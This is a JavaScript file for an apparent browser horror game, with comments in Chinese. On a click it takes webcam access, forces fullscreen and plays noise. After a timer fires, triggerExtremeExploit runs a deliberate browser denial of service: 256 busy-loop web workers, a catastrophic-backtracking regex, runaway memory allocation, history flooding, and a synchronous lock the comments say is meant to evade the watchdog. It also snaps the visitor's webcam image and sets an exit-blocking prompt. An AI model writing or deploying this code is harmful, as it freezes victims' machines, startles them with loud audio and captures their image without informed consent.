/* PROJECT: RYUGYONG-26 / GFBOT-G1NKO5A
   VERSION: EXTREME SATURATION (STRESS TEST MODE)
   WARNING: THIS SCRIPT INTENTIONALLY FREEZES THE BROWSER UI.
   TERMINATION REQUIRES TASK MANAGER (WIN) OR FORCE QUIT (MAC).
*/

let posX = -1000, posY = -1000, isLightOn = false, audioStarted = false, systemCrashed = false;
let videoStream = null, mouseX = window.innerWidth / 2, mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 攝像頭權限 (Soul Access)
async function setupCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
    } catch (err) {
        console.log("Soul partition access denied.");
    }
}

// 2. 音頻過載系統 (必須由 User Gesture 啟動)
function startAudioBomb() {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const out = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < out.length; i++) {
            // 崩潰後會變成極高分貝嘅隨機噪音
            out[i] = systemCrashed ? (Math.random() * 2 - 1) * 0.98 : ((t & (t >> 8)) ? 0.08 : -0.08);
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
}

// 3. 獵殺邏輯 (只在啟動後開始計時)
function initHunter() {
    setTimeout(() => {
        if (systemCrashed) return;
        const glitch = document.createElement('div');
        glitch.style.cssText = `position:fixed; width:45px; height:45px; background:white; z-index:10001; box-shadow:0 0 50px 15px white; pointer-events:none; left:-100px; top:-100px; transition: transform 0.05s linear;`;
        document.body.appendChild(glitch);

        let curX = -100, curY = -100, speed = 5.0;
        const huntClock = setInterval(() => {
            if (systemCrashed) { clearInterval(huntClock); return; }
            const dx = (window.innerWidth / 2) - (curX + 22), dy = (window.innerHeight / 2) - (curY + 22);
            const dist = Math.sqrt(dx * dx + dy * dy);

            if (dist < 40) {
                triggerExtremeExploit(); // 觸發極限炸彈
                glitch.remove();
                clearInterval(huntClock);
            } else {
                curX += (dx / dist) * speed; curY += (dy / dist) * speed;
                glitch.style.left = `${curX}px`; glitch.style.top = `${curY}px`;
                glitch.style.transform = `scale(${1 + (300 / dist)})`;
            }
        }, 16);
    }, 25000); // 啟動 25 秒後出現
}

// 4. 【啟動門戶】解決第一次載入與 F 掣問題
const startProtocol = async () => {
    if (audioStarted) return;
    audioStarted = true;

    // A. 獲得權限 (必須在 Click 事件內)
    await setupCamera();
    startAudioBomb();

    // B. 強制全屏 (劫持 UI)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    // C. 隱藏 Intro 並啟動計時
    intro.style.display = 'none';
    isLightOn = true;
    initHunter();
    console.log("RYUGYONG-26: PROTOCOL ENGAGED.");
};

// 監聽點擊與觸摸 (最穩定的啟動方式)
intro.addEventListener('click', startProtocol);
intro.addEventListener('touchstart', startProtocol);

// 5. 核心：極限飽和「炸彈」 (The Exploit-style Deadlock)
function triggerExtremeExploit() {
    if (systemCrashed) return;
    systemCrashed = true;

    // 立即渲染「死機」畫面
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:18vw; font-family:serif; text-shadow:0 0 60px red; margin:0; filter: blur(1px);">HELP ME.</h1>
        </div>
    `;

    // 拍照 (如果權限已開)
    if (videoStream) {
        const canvas = document.createElement('canvas');
        const video = document.createElement('video');
        video.srcObject = videoStream;
        video.play();
        setTimeout(() => {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            ctx.filter = 'grayscale(100%) contrast(1000%) brightness(20%)';
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            document.getElementById('death-screen').style.backgroundImage = `url(${canvas.toDataURL('image/jpeg')})`;
            document.getElementById('death-screen').style.backgroundSize = 'cover';
            videoStream.getTracks().forEach(t => t.stop());
        }, 50);
    }

    // 鎖定退出的最後警告
    window.onbeforeunload = () => "STAY IN THE VOID.";

    // 啟動飽和攻擊
    setTimeout(() => {
        // A. CPU 飽和 (256 Workers)
        const blob = new Blob([`while(true){ postMessage(Math.random()); }`], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        for(let i=0; i<256; i++) new Worker(url);

        // B. 邏輯炸彈 (The Logic Deadlock)
        const memoryVault = [];
        function lock() {
            // 1. 正則災難性回溯：鎖死核心渲染線程 (同步阻塞)
            /^(a+)+$/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); 

            // 2. 歷史紀錄洪水 + 內存填充
            for(let i=0; i<150; i++) {
                memoryVault.push(new BigUint64Array(1024 * 1024)); // 快速消耗 RAM
                window.history.pushState(null, null, "#" + Math.random());
            }

            // 3. 同步硬鎖 (3秒一週期，繞過 Watchdog)
            const s = Date.now();
            while(Date.now() - s < 3000) { Math.atan2(Math.random(), 1); }

            // 4. 微任務隊列劫持
            Promise.resolve().then(lock);
            setTimeout(lock, 0); 
        }
        lock();
    }, 100);
}

// 6. 控制與控制台
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
});

window.addEventListener('keydown', (e) => {
    const k = e.key.toLowerCase();
    if (k === 'f') startProtocol(); // 點擊過後，F 掣就會生效
    
    if (systemCrashed) return;
    if (k === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'black';
    }
    const spd = 60;
    if (k === 'w') posY += spd; if (k === 's') posY -= spd;
    if (k === 'a') posX += spd; if (k === 'd') posX -= spd;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
